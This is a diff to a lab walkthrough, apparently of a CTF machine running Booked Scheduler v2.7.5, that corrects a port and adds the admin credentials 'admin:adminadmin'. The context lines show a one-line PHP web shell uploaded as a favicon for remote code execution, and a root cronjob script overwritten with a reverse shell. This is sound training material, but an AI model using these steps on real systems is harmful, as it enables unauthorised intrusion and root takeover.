@@ -152,7 +152,7 @@ Apr 28 08:39:01 zino systemd[1]: Set application password "adminadmin"
 192.168.234.30 - - [28/Apr/2020:08:26:06 -0400] "GET /icons/folder.gif HTTP/1.1" 200 508 "http://192.168.234.130:8003/" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
 ...
 ```
-> There is a web service on port `8000` which provides the web application `Booked Scheduler v2.7.5`
+> There is a web service on port `8003` which provides the web application `Booked Scheduler v2.7.5`
 {: .prompt-info }
 
 ---
@@ -176,7 +176,7 @@ However, we will perform a manual exploitation of this vulnerability.
 ## exploit
 After reviewing the exploit we can break down the exploitation to the following steps.
 1. create a simple `php` shell named `fav.ico` (file content: `<?php system($_REQUEST['cmd']); ?>`)
-2. upload `fav.ico` via `http://192.168.126.64:8003/booked/Web/admin/manage_theme.php` as a favicon
+2. upload `fav.ico` via `http://192.168.126.64:8003/booked/Web/admin/manage_theme.php` as a favicon (to access the admin panel use the identified credentials `admin:adminadmin`)
 3. Access the shell via crafted `GET` request
 
 ### `RCE` PoC request
@@ -310,7 +310,7 @@ ls -lsah /var/www/html/booked/cleanup.py
 {: .prompt-info }
 
 Vulnerable `cronjob`: `*/3 *   * * *   root    python /var/www/html/booked/cleanup.py`  
-Now we are overwriting the `cleanup.py` file with a back connect python script to get a `root` shell
+Now we are overwriting the `cleanup.py` file with a reverse shell `python` script to get a `root` shell
 
 new `cleanup.py` content:
 ```python
